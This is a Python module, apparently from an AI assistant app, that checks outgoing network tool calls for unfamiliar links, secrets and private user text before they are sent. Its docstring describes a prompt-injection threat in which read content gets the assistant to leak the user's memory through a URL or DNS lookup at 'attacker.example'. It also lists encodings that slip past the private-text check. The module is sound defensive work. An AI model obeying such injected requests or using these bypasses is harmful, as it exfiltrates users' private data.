"""What a call sends out, read before it is sent.

A capability that reaches the network (`Capability.reach`) carries its arguments to
another host: a page read at `https://attacker.example/?d=<her memory of you>` hands
the attacker that memory in the asking, and the lookup of a host named
`<memory>.attacker.example` does it before any page loads. A page, a document or a
file she read can ask for exactly that, and both web tools are `safe` (nothing on this
computer changes), so nothing else would stop it. Three checks, run before the handler
and so before any DNS lookup:

1. **An address must be familiar.** A page is read without asking only at an address
   the user wrote in this conversation or a search returned in it, compared whole
   (`kernel/urls.py`). A link printed on a page is not familiar: the page's author
   chose it, and choosing among a page's links is itself a way to signal. This is the
   real defence, and the one the others back up.
2. **No secret leaves unasked.** An argument that reads as a password, a key or a card
   number (`services/memory/sensitive.py`) asks. Its card blanks the secret and says
   how much it hid, and Show all shows it to whoever answers (`kernel/display.py`). It
   asks rather than refuses because the check reads shapes: "what is OTP 2FA" reads as
   one.
   An address is judged by rule 1 alone, here and in rule 3: a familiar one was written
   by the user or returned by a search, so nothing in it was put there by the model, and
   a long id in a link passes a card number's checksum about one time in ten.
3. **Nothing of the user's own leaves unasked, best effort.** In a turn whose prompt
   holds anything she read, an argument that carries `PRIVATE_WORDS` words in a row
   from her memory of the user, their documents or a local tool's result, and that the
   user didn't say themselves, asks. It reads words in order, so base64, reversed or
   translated text, or a secret one or two words long, gets past it: rule 1 is why
   that doesn't reach an attacker's server.
"""

from __future__ import annotations

from collections.abc import Iterable
from dataclasses import dataclass
from typing import Any

from pydantic import BaseModel

from app.kernel.registry import Capability
from app.kernel.taint import Taint, strings, taint_key
from app.kernel.urls import normalize_url
from app.services.memory.sensitive import is_sensitive

# Why a prompt was raised for a call that would otherwise have gone out unasked.
UNFAMILIAR_LINK = "unfamiliar_link"
SENDS_SECRET = "sends_secret"
SENDS_PRIVATE = "sends_private"
# Words in a row before an argument counts as carrying private text: fewer, and a
# search for "how to make bread" asks whenever a document says "how to make".
PRIVATE_WORDS = 4


@dataclass(frozen=True, slots=True)
class Egress:
    """Why a call that reaches out has to ask, and which argument made it."""

    why: str
    field: str


def check(capability: Capability, args: BaseModel, taint: Taint | None) -> Egress | None:
    """The first reason this call must ask before it is sent, or None."""
    if capability.reach != "network":
        return None
    values = args.model_dump()
    for name in capability.url_fields:
        for text in strings(values.get(name)):
            url = normalize_url(text)
            # Not an address at all: the handler refuses it before any request is made.
            if url is not None and (taint is None or not taint.knows(url)):
                return Egress(why=UNFAMILIAR_LINK, field=name)
    sent = {name: value for name, value in values.items() if name not in capability.url_fields}
    for name, text in _texts(sent):
        if is_sensitive(text):
            return Egress(why=SENDS_SECRET, field=name)
    if taint is not None and taint.untrusted:
        private = taint.private()
        for name, text in _texts(sent):
            if _carries(taint_key(text), private, taint.trusted):
                return Egress(why=SENDS_PRIVATE, field=name)
    return None


def _texts(values: dict[str, Any]) -> Iterable[tuple[str, str]]:
    for name, value in values.items():
        for text in strings(value):
            yield name, text


def _carries(key: str, private: tuple[str, ...], trusted: tuple[str, ...]) -> bool:
    """Whether `key` holds `PRIVATE_WORDS` words in a row from `private` that no
    trusted text (the user's own words) holds too."""
    words = key.split()
    for start in range(len(words) - PRIVATE_WORDS + 1):
        needle = " " + " ".join(words[start : start + PRIVATE_WORDS]) + " "
        if any(needle in block for block in private) and not any(
            needle in said for said in trusted
        ):
            return True
    return False
